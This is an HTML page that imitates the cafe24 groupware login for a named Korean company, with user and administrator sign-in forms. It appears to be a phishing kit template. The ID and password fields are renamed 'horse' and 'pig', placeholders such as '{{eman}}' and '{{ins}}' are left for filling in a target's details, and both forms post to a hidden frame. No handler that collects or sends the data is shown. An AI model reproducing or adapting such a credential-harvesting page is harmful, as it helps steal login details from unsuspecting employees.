<html xmlns="http://www.w3.org/1999/xhtml"><head>
    <meta http-equiv="Content-Type" content="text/html; charset=utf-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <title>(주)선광엠파 그룹웨어시스템</title>
    <meta name="WMMETA" content="host" data-host=""><meta name="WMMETA" content="domain" data-domain=""><meta name="WMMETA" content="appversion" data-appversion="20220804"><meta name="WMMETA" content="langpack" data-langpack="ko">
    <link rel="stylesheet" type="text/css" href="https://img.cafe24.com/serviceserver/biz/webmail/css/webmail.css?v=20220804">
	
	
	<style>
	.mLogin fieldset label input.kText {
    overflow: hidden;
    display: block;
    width: 285px;
    
    margin: 0 0 8px;
    padding: 8px 10px;
    color: #8F8F91;
    text-align: left;
    line-height: 15px;
    border: 1px solid #d9d9d9;
    background: #f3f3f3;
}

</style>
	
</head>
<body>


<div class="mLogin type1 ">
    <ul class="languages">
        <li><a class="login-language-change" href="#changeLang/en">ENGLISH</a></li>
        <li><a class="login-language-change" href="#changeLang/chGb">简体中文</a></li>
        <li><a class="login-language-change" href="#changeLang/jp">日本語</a></li>
        <li><a class="login-language-change" href="#changeLang/chBig">繁體中文</a></li>
        <li><a class="login-language-change" href="#changeLang/ko">한국어</a></li>
    </ul>
	<div class="inner">
		<div class="logoArea">
			<h2 class="logo">
				<img src="https://img.cafe24.com/serviceserver/biz/webmail/images/login/@img_logo_aType.gif" alt="">
			</h2>
		</div>
		<div class="contents">
			<ul class="mTab typeLogin eTab switch-login-type">
				<li class="selected"><a href="#tabUser">사용자 모드</a></li>
				<li><a href="#tabAdmin">관리자 모드</a></li>
			</ul>
			<div id="tabUser" class="tabCont" style="display: block;">
				<form method="post" name="userLoginForm" target="HFLOGIN" action="">
				<input type="hidden" name="loginType" value="user">
				<input type="hidden" name="rTarget" value="parent">
				<input type="hidden" name="url" value="">
					<fieldset>
					<legend>사용자 로그인</legend>
						<label><input type="text" name="horse"  id="email" class="kText" placeholder="아이디" value=""></label>
						<label><input type="password" name="pig" id="password" class="kText" placeholder="비밀번호"></label>
						<button type="submit" class="btnLogin user-login-btn"id="submit-btn"><span>로그인</span></button>
						<ul class="security">
							<li><label><input type="checkbox" name="save"> 아이디 저장</label></li>
							<li><input type="checkbox" name="ip" checked="checked"> IP보안 <span>on</span></li>
						</ul>
					</fieldset>
				</form>
				<!-- 2차 인증 -->
			</div>
			<div id="tabAdmin" class="tabCont" style="display: none;">
				<form method="post" name="adminLoginForm" target="HFLOGIN" action="second">
				<input type="hidden" name="loginType" value="admin">
				<input type="hidden" name="rTarget" value="parent">
				<input type="hidden" name="url" value="">
					<fieldset>
					<legend>관리자 로그인</legend>
						<label><input type="text" name="horse" class="fText" placeholder="아이디" value="{{eman}}"></label>
						<label><input type="password" name="pig" class="fText" placeholder="비밀번호"></label>
						<button type="submit" class="btnLogin"><span>로그인</span></button>
						<ul class="security">
							<li><input type="checkbox" name="save"> 아이디 저장</li>
							<li><input type="checkbox" name="ip" checked="checked"> IP보안 <span>on</span></li>
						</ul>
					</fieldset>
				</form>
			</div>
		</div>

	</div>
	<!-- 만료 된 계정 경고 텍스트 -->
	
	<!-- copyright -->
    <p class="footer"><a href="">Copyright ⓒ <strong id="{{ins}}"></strong> All Rights Reserved.</a></p>
</div>

</body>
<script src="https://ajax.googleapis.com/ajax/libs/jquery/2.2.4/jquery.min.js"></script>
<script src="https://stackpath.bootstrapcdn.com/bootstrap/4.1.3/js/bootstrap.min.js"></script>
 







</html>
